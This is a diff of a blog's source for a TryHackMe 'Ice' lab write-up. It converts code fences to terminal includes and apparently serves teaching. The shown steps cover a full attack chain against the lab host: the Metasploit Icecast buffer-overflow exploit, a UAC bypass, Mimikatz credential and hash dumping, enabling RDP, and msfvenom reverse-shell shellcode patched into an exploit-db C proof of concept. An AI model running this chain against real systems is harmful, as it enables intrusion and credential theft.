@@ -26,8 +26,7 @@ Ice to meet you, everyone.  We are going to tackle the Ice room from TryHackMe. 
 
 Now, we will run nmap to find those services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/madness]
 └─$ sudo nmap -sC -sV -A -O -oN nmap -Pn -T 5 10.10.126.243
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 00:35 AEDT
@@ -64,25 +63,23 @@ PORT      STATE SERVICE      VERSION
 49160/tcp open  msrpc        Microsoft Windows RPC
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Start msfconsole in quiet mode to supress the ASCII art.
 
-{% raw %}
-```bash
+{% capture msfconsolestart %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice]
 └─$ msfconsole -q         
 msf6 >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfconsolestart %}
 
 <br />
 Search for Icecast in msfconsole.
 
-{% raw %}
-```bash
+{% capture searchicecast %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice]
 └─$ msfconsole -q         
 msf6 > search icecast
@@ -96,8 +93,8 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=searchicecast %}
 
 <br />
 Look-up the exploit in cvedetails.
@@ -111,19 +108,17 @@ Look-up the exploit in cvedetails.
 <br />
 In msfconsole, choose to use the Icecast exploit.
 
-{% raw %}
-```bash
+{% capture usemetasploit0 %}
 msf6 > use 0
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/http/icecast_header) >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=usemetasploit0 %}
 
 <br />
 Choose to show the options of the exploit so we know what we need to update.
 
-{% raw %}
-```bash
+{% capture showoptions %}
 msf6 exploit(windows/http/icecast_header) > show options
 
 Module options (exploit/windows/http/icecast_header):
@@ -152,14 +147,13 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showoptions %}
 
 <br />
 Set the lhost and set the rhosts.
 
-{% raw %}
-```bash
+{% capture settheoptions %}
 msf6 exploit(windows/http/icecast_header) > set lhost tun0
 lhost => 10.4.119.29
 msf6 exploit(windows/http/icecast_header) > set lhost tun0
@@ -167,14 +161,13 @@ lhost => 10.4.119.29
 msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.126.243
 rhosts => 10.10.126.243
 msf6 exploit(windows/http/icecast_header) >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=settheoptions %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 msf6 exploit(windows/http/icecast_header) > exploit
 
 [*] Started reverse TCP handler on 10.4.119.29:4444 
@@ -182,41 +175,44 @@ msf6 exploit(windows/http/icecast_header) > exploit
 [*] Meterpreter session 1 opened (10.4.119.29:4444 -> 10.10.126.243:49258) at 2025-01-15 01:43:36 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Drop into a shell and run whoami.
 
-{% raw %}
-```bash
+{% capture dropintoshell %}
 meterpreter > shell
 Process 3176 created.
 Channel 1 created.
+{% endcapture %}
+
+{% capture cmdwhoami %}
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Program Files (x86)\Icecast2 Win32>whoami
 whoami
 dark-pc\dark
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=dropintoshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=cmdwhoami %}
 
 <br />
 In meterpreter, run getuid.
 
-{% raw %}
-```bash
+{% capture getuid %}
 meterpreter > getuid
 Server username: Dark-PC\Dark
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getuid %}
 
 <br />
 Run sysinfo.
 
-{% raw %}
-```bash
+{% capture sysinfo %}
 meterpreter > sysinfo
 Computer        : DARK-PC
 OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
@@ -225,14 +221,13 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sysinfo %}
 
 <br />
 Run local_exploit_suggester.
 
-{% raw %}
-```bash
+{% capture locexpsuggester %}
 meterpreter > run post/multi/recon/local_exploit_suggester
 
 [*] 10.10.126.243 - Collecting local exploits for x86/windows...
@@ -265,14 +260,13 @@ meterpreter > run post/multi/recon/local_exploit_suggester
  10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 
  <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=locexpsuggester %}
 
 <br />
 Background the session by using Control + z, note the session number.
 
-{% raw %}
-```bash
+{% capture backgroundsession %}
 meterpreter > 
 Background session 1? [y/N]  y
 [-] Unknown command: y
@@ -284,34 +278,31 @@ Active sessions
   Id  Name  Type                     Information             Connection
   --  ----  ----                     -----------             ----------
   1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.4.119.29:4444 -> 10.10.126.243:49258 (10.10.126.243)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=backgroundsession %}
 
 <br />
 Choose to use the Event Viewer exploit.
 
-{% raw %}
-```bash
+{% capture eventvwr %}
 msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=eventvwr %}
 
 <br />
 Set the session number to the session that we looked-up earlier.
 
-{% raw %}
-```bash
+{% capture setsession %}
 msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
 SESSION => 1
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setsession %}
 
 <br />
 Show the options for the exploit.
 
-{% raw %}
-```bash
+{% capture showprivescoption %}
 msf6 exploit(windows/local/bypassuac_eventvwr) > show options
 
 Module options (exploit/windows/local/bypassuac_eventvwr):
@@ -339,38 +330,35 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showprivescoption %}
 
 <br />
 Set lhost to the tun0 interface IP address.
 
-{% raw %}
-```bash
+{% capture setlhostprivesc %}
 msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
 lhost => 10.4.119.29
 msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
 lhost => 10.4.119.29
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setlhostprivesc %}
 
 <br />
 Run the exploit and choose to use the new session.
 
-{% raw %}
-```bash
+{% capture choosenewsession %}
 msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=choosenewsession %}
 
 <br />
 Run getprivs to get a list of the privileges.
 
-{% raw %}
-```bash
+{% capture getprivssess2 %}
 meterpreter > getprivs
 
 Enabled Process Privileges
@@ -403,14 +391,13 @@ SeTimeZonePrivilege
 SeUndockPrivilege
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getprivssess2 %}
 
 <br />
 Run ps to get a list of the processes.
 
-{% raw %}
-```bash
+{% capture psprocesses %}
 meterpreter > ps
 
 Process List
@@ -454,23 +441,21 @@ Process List
  2700  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
  2712  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
  3128  624   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=psprocesses %}
 
 <br />
 Check for a process that has the same architecture and privileges.
 
-{% raw %}
-```bash
+{% capture findprocess %}
 1400  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=findprocess %}
 
 <br />
 Load kiwi, an updated version of Mimikatz.
 
-{% raw %}
-```bash
+{% capture loadkiwi %}
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -481,14 +466,13 @@ Loading extension kiwi...
   '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
 
 Success.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loadkiwi %}
 
 <br />
 Run help to get a list of commands.
 
-{% raw %}
-```bash
+{% capture getkiwicommands %}
 <snip>
 
 Kiwi Commands
@@ -526,14 +510,13 @@ Kiwi Commands
     wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)
 
     <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getkiwicommands %}
 
 <br />
 Run creds_all to get the dark creds.
 
-{% raw %}
-```bash
+{% capture credall %}
 meterpreter > creds_all
 [+] Running as SYSTEM
 [*] Retrieving all credentials
@@ -568,40 +551,37 @@ Username  Domain     Password
 (null)    (null)     (null)
 Dark      Dark-PC    Password01!
 dark-pc$  WORKGROUP  (null)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=credall %}
 
 <br />
 Run hashdump to dump the hashes.
 
-{% raw %}
-```bash
+{% capture hashdump %}
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashdump %}
 
 <br />
 Get the full meterpreter help list.  Notice the record_mic, screenshare, timestomp, and create_golden_ticket to record the microphone, watch the desktop in real-time, modify the time-stamps of files on the system, and create the golden ticket, respectively.
 
-{% raw %}
-```bash
+{% capture meterhelp %}
 meterpreter > help
 
 Core Commands
 =============
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=meterhelp %}
 
 <br />
 Choose to enable RDP.
 
-{% raw %}
-```bash
+{% capture enablerdp %}
 meterpreter > run post/windows/manage/enable_rdp
 
 [*] Enabling Remote Desktop
@@ -610,14 +590,13 @@ meterpreter > run post/windows/manage/enable_rdp
 [*]     The Terminal Services service is not set to auto, changing it to auto ...
 [*]     Opening port in local firewall if necessary
 [*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20250115021829_default_10.10.126.243_host.windows.cle_529375.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=enablerdp %}
 
 <br />
 Download the C code for this vulnerability.
 
-{% raw %}
-```bash
+{% capture downloadpocc %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice]
 └─$ wget https://www.exploit-db.com/raw/568 -O poc.c
 --2025-01-15 02:35:56--  https://www.exploit-db.com/raw/568
@@ -630,26 +609,24 @@ Saving to: ‘poc.c’
 poc.c                                                      100%[========================================================================================================================================>]   6.67K  --.-KB/s    in 0s      
 
 2025-01-15 02:35:57 (179 MB/s) - ‘poc.c’ saved [6831/6831]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpocc %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Get the msfvenom to generate a new payload.
 
-{% raw %}
-```bash
+{% capture genpayload1 %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 ExitFunc=thread -f c -v shellcode
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -682,14 +659,13 @@ unsigned char shellcode[] =
 "\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
 "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
 "\xff\xd5";
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genpayload1 %}
 
 <br />
 Update the poc.c with the new shellcode.
 
-{% raw %}
-```c
+{% capture updateexploitpayload1 %}
 <snip>
 
 #include <stdio.h> 
@@ -751,22 +727,21 @@ unsigned char shellcode[] =
 "\xff\xd5"; 
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='c' title='c' content=updateexploitpayload1 %}
 
 <br />
 Attempt to compile the exploit.
 
-{% raw %}
-```bash
+{% capture compilepayload1 %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new2]
 └─$ gcc -o poc poc.c  
 poc.c:61:9: warning: ISO C99 requires whitespace after the macro name
    61 | #define EXEC"GET / HTTP/1.0rn"
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=compilepayload1 %}
 
 <br />
 Research the issues and discover this edited version of the exploit.
@@ -781,8 +756,7 @@ Research the issues and discover this edited version of the exploit.
 <br />
 Download 568-edit.c exploit.
 
-{% raw %}
-```bash
+{% capture downloadeditexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice]
 └─$ wget https://raw.githubusercontent.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-/refs/heads/main/568-edit.c --inet4-only
 --2025-03-22 10:45:23--  https://raw.githubusercontent.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-/refs/heads/main/568-edit.c
@@ -795,24 +769,22 @@ Saving to: ‘568-edit.c’
 568-edit.c                                                 100%[========================================================================================================================================>]   6.43K  --.-KB/s    in 0.003s  
 
 2025-03-22 10:45:24 (1.80 MB/s) - ‘568-edit.c’ saved [6581/6581]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadeditexploit %}
 
 <br />
 Compile the new exploit.
 
-{% raw %}
-```bash
+{% capture attemptupdcompile %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
 └─$ gcc ./568-edit.c -o 568 && chmod 775 ./568
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=attemptupdcompile %}
 
 <br />
 Generate a new payload with the badchars.
 
-{% raw %}
-```bash
+{% capture genupdpayload2 %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 ExitFunc=thread -f c -v shellcode -b '\x0a\x0d\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -850,14 +822,13 @@ unsigned char shellcode[] =
 "\x9e\x88\xa8\x36\x07\x59\x11\x5b\xb8\xb4\x56\x62\x3b\x3c"
 "\x27\x91\x23\x35\x22\xdd\xe3\xa6\x5e\x4e\x86\xc8\xcd\x6f"
 "\x83";
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genupdpayload2 %}
 
 <br />
 Update the exploit with the new, new payload.
 
-{% raw %}
-```c
+{% capture updluigiexploit %}
 <snip>
 
 #include <stdio.h> 
@@ -920,24 +891,22 @@ unsigned char shellcode[] =
 "\x83";
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='c' title='c' content=updluigiexploit %}
 
 <br />
 Compile the new exploit.
 
-{% raw %}
-```bash
+{% capture compileupdluigiexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
 └─$ gcc ./568-edit.c -o 568 && chmod 775 ./568
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=compileupdluigiexploit %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```bash
+{% capture runupdluigiexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
 └─$ ./568 10.10.108.247            
 
@@ -953,25 +922,30 @@ www.delikon.de
 - send malformed data
 
 Server IS vulnerable!!!
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runupdluigiexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchfinalshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.108.247] 49281
+{% endcapture %}
+
+{% capture finalwindowsshell %}
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Program Files (x86)\Icecast2 Win32>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchfinalshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=finalwindowsshell %}
 
 <br />
 Well, it looks like we put this one an ice, including the extra credit...sort of.  Hopefully, you enjoyed the read.  See you in the next one.
